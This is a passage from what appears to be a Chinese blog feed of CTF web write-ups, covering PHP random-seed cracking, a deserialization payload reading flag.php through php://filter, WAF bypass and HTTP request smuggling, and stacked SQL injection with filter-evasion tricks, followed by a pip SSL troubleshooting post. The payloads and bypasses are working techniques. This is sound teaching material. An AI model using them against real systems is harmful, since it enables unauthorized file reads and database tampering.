61 8 8 0 61 53 53 0 61 40 40 0 61 4 4 0 61 18 18 0 61 54 54 0 61</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/x8DmpyH452TlakC.png" alt="微信截图_20210113184021"></p><p>用脚本爆破种子</p><p><img src="https://i.loli.net/2021/01/14/Kuwxg1ofsTdV9WI.png" alt="QQ截图20210113184233"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 36 36 0 61 31 31 0 61 17 17 0 61 6 6 0 61 8 8 0 61 53 53 0 61 40 40 0 61 4 4 0 61 18 18 0 61 54 54 0 61</span><br><span class="line"><span class="comment">#961723226</span></span><br></pre></td></tr></table></figure><p>将种子代入原函数得到字符串</p><p><img src="https://i.loli.net/2021/01/13/3DYUHOhNkdM862W.png" alt="QQ截图20210113184329"></p><p>php_my_seed使用方法：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/3656#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-3</a></li><li><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/192012.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;GWCTF-2019-枯燥的抽奖&quot;&gt;&lt;a href=&quot;#GWCTF-2019-枯燥的抽奖&quot; class=&quot;headerlink&quot; title=&quot;[GWCTF 2019]枯燥的抽奖&quot;&gt;&lt;/a&gt;[GWCTF 2019]枯燥的抽奖&lt;/h1&gt;&lt;p&gt;考点：php伪随机数&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
      <category term="伪随机数" scheme="http://goudanjun.vip/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>[网鼎杯 2020 青龙组] AreUSerialz</title>
    <link href="http://goudanjun.vip/2021/01/17/%C2%96-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz.html/"/>
    <id>http://goudanjun.vip/2021/01/17/-网鼎杯-2020-青龙组-AreUSerialz.html/</id>
    <published>2021-01-17T12:22:49.000Z</published>
    <updated>2021-01-17T13:01:49.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组] AreUSerialz"></a>[网鼎杯 2020 青龙组] AreUSerialz</h1><p>借这道题复习记录下反序列化的小细节~</p><a id="more"></a><p>首先源码审计，这里就不贴源码了，直接看可控参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $op;</span><br><span class="line"><span class="keyword">protected</span> $filename;</span><br><span class="line"><span class="keyword">protected</span> $content;</span><br></pre></td></tr></table></figure><p>op为操作标识，op=1时写文件，op=2时读文件；filename 标识读取文件的名字；content 是写文件时写入的内容</p><p>看源代码中的魔术方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)<span class="comment">//强类型</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中反序列化时不会调用 构造函数，所以我们将注意力放在析构函数中，注意到析构函数中有一个强类型比较</p><p>而在 process()函数中 是弱类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;<span class="comment">//弱类型</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们使 op=2 ，在析构函数中强类型比较为 false，而在process()中弱类型比较为 true</p><p>之后在read函数中，我们的可控变量为filename，利用php伪协议进行读取文件操作 ：php://filter/read=convert.base64-encode/resource=flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到这里我们就可以构造payload了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a)</span><br><span class="line"><span class="comment"># O:11:"FileHandler":3:&#123;s:5:"%00*%00op";i:2;s:11:"%00*%00filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:"%00*%00content";N;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里注意 protected 属性的变量在序列化时 变量名前需要加”%00*%00“</p><p>在这道题中%00的ascii码为0 会被is_valid()函数拦截，这里绕过的话可以利用php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a)</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ctf中的php反序列化可参考以下链接</p><ul><li><a href="https://www.cnblogs.com/fish-pompom/p/11126473.html" target="_blank" rel="noopener">https://www.cnblogs.com/fish-pompom/p/11126473.html</a></li><li><a href="https://www.cnblogs.com/Cl0ud/p/12874458.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12874458.html</a></li><li><a href="https://www.cnblogs.com/Xy--1/p/12649865.html" target="_blank" rel="noopener">https://www.cnblogs.com/Xy--1/p/12649865.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;网鼎杯-2020-青龙组-AreUSerialz&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-青龙组-AreUSerialz&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 青龙组] AreUSerialz&quot;&gt;&lt;/a&gt;[网鼎杯 2020 青龙组] AreUSerialz&lt;/h1&gt;&lt;p&gt;借这道题复习记录下反序列化的小细节~&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
      <category term="反序列化" scheme="http://goudanjun.vip/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>[RoarCTF 2019]Easy Calc</title>
    <link href="http://goudanjun.vip/2021/01/17/%C2%96-RoarCTF-2019-Easy-Calc.html/"/>
    <id>http://goudanjun.vip/2021/01/17/-RoarCTF-2019-Easy-Calc.html/</id>
    <published>2021-01-17T12:22:30.000Z</published>
    <updated>2021-01-17T13:01:53.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><a id="more"></a><h2 id="方法一：PHP特性"><a href="#方法一：PHP特性" class="headerlink" title="方法一：PHP特性"></a>方法一：PHP特性</h2><p>在参数名称前加空格即“ num”，waf识别为“ num”，但是PHP解析时会自动将空格去掉。</p><p>由于过滤了“ / ”，我们构造payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">calc.php? num=var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">calc.php? num=var_dump(file_get_contents(chr(<span class="number">47</span>).f1agg))</span><br></pre></td></tr></table></figure><h2 id="方法二：HTTP走私"><a href="#方法二：HTTP走私" class="headerlink" title="方法二：HTTP走私"></a>方法二：HTTP走私</h2><p>看wp这道题还有HTTP走私这种方法，所以想来重点记录下</p><h3 id="HTTP走私原理"><a href="#HTTP走私原理" class="headerlink" title="HTTP走私原理"></a>HTTP走私原理</h3><p>​    在HTTP1.1之后，HTTP规定了两种标识来表示请求结束，分别是 Content-Length（CL）标头和Transfer-Encoding（TE）标头</p><p>​    CL：以字节为单位指定消息内容体的长度。</p><p>​    TE：指定消息体使用分块编码（ChunkedEncode），即 Transfer-Encoding：chunked ，也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示） 衡量，后跟CRLF（\r\n），然后是块内容，最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p><p>​    当我发送请求，包含Content-Length，前端服务器解析后没有问题发送给后端服务器，但是我在请求时后面还包含了Transfer-Encoding，这样后端服务器进行解析便可执行我写在下面的一些命令，这样便可以绕过前端的waf。</p><h3 id="HTTP走私的四种方法"><a href="#HTTP走私的四种方法" class="headerlink" title="HTTP走私的四种方法"></a>HTTP走私的四种方法</h3><h4 id="CL不为0时"><a href="#CL不为0时" class="headerlink" title="CL不为0时"></a>CL不为0时</h4><p>这种情况一般发生在get请求下，当前端允许content-length，后端不允许时，此时后端服务器就不会解析content-length，这样就可能绕过waf。</p><h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p>这种利用的前提条件是服务器不会返回400错误。但是前端服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理,这样便有可能引发请求走私。比如出现下面这种情况时：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span>: 68</span><br><span class="line"><span class="attribute">Content-Length</span>: 5</span><br><span class="line"> </span><br><span class="line">num=1GET /calc.php?num=1 HTTP/1.1</span><br><span class="line"><span class="attribute">123456</span></span><br></pre></td></tr></table></figure><p>前端先解析第一个cl为68，就会把下面的“num=1GET/calc.php?num=1 HTTP/1.1”都当做请求的内容。但是后端会解析第二个cl，也就是说后端只解析“num=1” 后面的请求体就作为下次请求的请求头（前提是Connection:keep-alive）。这样就会引发走私。</p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length这一请求头，而后端服务器会忽略掉Content-Length，处理Transfer-Encoding这一请求头。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span>: 123</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></table></figure><p>这里的chunked对请求内容进行分块编码，并且直到有\r\n的时候才结束。</p><h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p><p>参考文章：<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p><hr><p>回到这道题，因为是get请求，而CL字段只有在post请求时才会有用，所以我们利用TE字段来绕过前端的waf</p><p><img src="https://i.loli.net/2021/01/12/KbxzFBj6M7adSGm.png" alt="image-20210112114930755"></p><p>在数据部分必须要加一个换行，来标识请求的结束，Connection也要改为keep-live</p><p>但是经过我的测试发现使用两个CL字段也可以进行绕过前端的waf</p><p><img src="https://i.loli.net/2021/01/12/FxA6fmstJRy4dK1.png" alt="image-20210112115225675"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Calc&quot; class=&quot;headerlink&quot; title=&quot;[RoarCTF 2019]Easy Calc&quot;&gt;&lt;/a&gt;[RoarCTF 2019]Easy Calc&lt;/h1&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
      <category term="HTTP走私" scheme="http://goudanjun.vip/tags/HTTP%E8%B5%B0%E7%A7%81/"/>
    
  </entry>
  
  <entry>
    <title>[强网杯 2019]随便注</title>
    <link href="http://goudanjun.vip/2021/01/17/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8.html/"/>
    <id>http://goudanjun.vip/2021/01/17/强网杯-2019-随便注.html/</id>
    <published>2021-01-17T12:22:13.000Z</published>
    <updated>2021-01-17T13:02:00.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>考点：堆叠注入</p><a id="more"></a><p>​        堆叠注入就是可以在一条sql语句后加分号，分号之后的就是一个全新的sql语句。但是使用条件十分有限，只有PHP的站在使用mysqli_multi_query()函数时，会同时解析多条语句。往往PHP的站会使用mysqli_ query()函数来限制只能执行一条语句，从而防止sql注入。</p><p>根据返回报错：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);</span></span><br></pre></td></tr></table></figure><p>尝试堆叠注入</p><p>查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' ; <span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' ; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>还可以使用语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' ; desc `1919810931114514`<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>注意当数字作为表名的时候，需要用反引号括起来。这里可以看到有flag字段，之后有三种方法可以获得flag。</p><p><img src="https://i.loli.net/2021/01/11/3Knxpz8MwAFNkqI.png" alt="QQ截图20210111111410"></p><h2 id="方法一：更改表名和列名"><a href="#方法一：更改表名和列名" class="headerlink" title="方法一：更改表名和列名"></a>方法一：更改表名和列名</h2><ol><li><p>将表名words换为其他的，类似于word1</p></li><li><p>将表名1919810931114514换为words</p></li><li><p>将列名flag换为id</p><p>构造语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' ; </span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`word1`</span> ;      </span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span> ;  </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">change</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>更改列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert table `words` <span class="keyword">rename</span> <span class="string">`flag`</span> <span class="keyword">to</span> <span class="string">`id`</span>;</span><br></pre></td></tr></table></figure><p>再进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/11/6Mi7CVoEzxd3LTD.png" alt="QQ截图20210111112336"></p></li></ol><h2 id="方法二：绕过select限制"><a href="#方法二：绕过select限制" class="headerlink" title="方法二：绕过select限制"></a>方法二：绕过select限制</h2><p>使用<strong>预编译</strong>的方式</p><blockquote><p>set  用于设置变量名和值</p><p>prepare  用于预备一个语句，并赋予名称，以后可以引用该语句</p><p>execute  执行语句</p><p>deallocate prepare  用来释放掉预处理的语句</p></blockquote><p>构造payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0';</span><br><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span> = <span class="keyword">CONCAT</span>(<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`;'</span>);</span><br><span class="line"><span class="keyword">prepare</span> <span class="keyword">exp</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">exp</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/11/TajpPA945koYRzn.png" alt="QQ截图20210111114359"></p><p>strstr函数不会识别大小写，所以我们进行大小写绕过即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0';</span><br><span class="line"><span class="keyword">Set</span> @<span class="keyword">sql</span> = <span class="keyword">CONCAT</span>(<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`;'</span>);</span><br><span class="line"><span class="keyword">prePare</span> <span class="keyword">exp</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">exp</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>还可以将“select * from <code>1919810931114514</code>”16进制编码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0';</span><br><span class="line"><span class="keyword">SeT</span> @<span class="keyword">sql</span>=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line"><span class="keyword">prepare</span> <span class="keyword">exp</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> <span class="keyword">exp</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/11/HrJGOV6ULQWFRhg.png" alt="QQ截图20210111115502"></p><h2 id="方法三：使用handler绕过"><a href="#方法三：使用handler绕过" class="headerlink" title="方法三：使用handler绕过"></a>方法三：使用handler绕过</h2><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0'; <span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/11/yf3neJBNulXFIKj.png" alt="QQ截图20210111124042"></p><p>注：handler用法</p><p>​    handler是MySQL中特有的语法，可代替select对表中的数据进行逐行的查询</p><p>​    基本语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">#FIRST获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">#通过HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过索引去查看的话可以按照一定的顺序，获取表中的数据。</span><br><span class="line">通过索引列指定一个值，可以指定从哪一行开始。</span><br><span class="line">通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</span><br><span class="line">如果我们不想浏览一个表的所有行，可以使用where和limit子句。</span><br></pre></td></tr></table></figure><p>参考链接 : <a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40785137</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;强网杯-2019-随便注&quot;&gt;&lt;a href=&quot;#强网杯-2019-随便注&quot; class=&quot;headerlink&quot; title=&quot;[强网杯 2019]随便注&quot;&gt;&lt;/a&gt;[强网杯 2019]随便注&lt;/h1&gt;&lt;p&gt;考点：堆叠注入&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
      <category term="SQL注入" scheme="http://goudanjun.vip/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="堆叠注入" scheme="http://goudanjun.vip/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>python3安装第三方包时ssl报错</title>
    <link href="http://goudanjun.vip/2021/01/17/python3%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E6%97%B6ssl%E6%8A%A5%E9%94%99.html/"/>
    <id>http://goudanjun.vip/2021/01/17/python3安装第三方包时ssl报错.html/</id>
    <published>2021-01-17T09:53:25.000Z</published>
    <updated>2021-01-17T13:03:23.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><blockquote><p>错误：CouldnotfetchURL<a href="https://pypi.python.org/simple/pytest-xdist/" target="_blank" rel="noopener">https://pypi.python.org/simple/pytest-xdist/</a>: There wasaproblem confirmingthessl certificate: [SSL: TLSV1_ALERT_PROTOCOL_VERSION] tlsv1 alert protocolversion(_ssl.c:590)</p></blockquote><a id="more"></a><p>原因：python.org已经不支持TLSv1.0和TLSv1.1，需要升级pip，但是pip用不了，所以手动升级</p><p>解决方案：</p><p>1.mac或者linux操作系统：在终端下执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://bootstrap.pypa.io/get-pip.py | python3</span><br></pre></td></tr></table></figure><p>2.windows操作系统：从<a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a> 下载get-pip.py文件，然后使用python运行这个文件python get-pip.py</p><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><blockquote><p>错误：Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by ‘SSLError(SSLError(1, u’[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:661)’),)’</p></blockquote><p>原因：可能用国外镜像源连接不好</p><p>解决方案：</p><p>1.mac或者linux操作系统：</p><p>修改 ~/.pip/pip.conf (没有就创建一个)， 更换 index-url</p><blockquote><p>[global]</p><p> index-url = <a href="http://pypi.douban.com/simple" target="_blank" rel="noopener">http://pypi.douban.com/simple</a></p></blockquote><p>2.windows操作系统：</p><p>直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini，内容同上</p><p>附：镜像源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 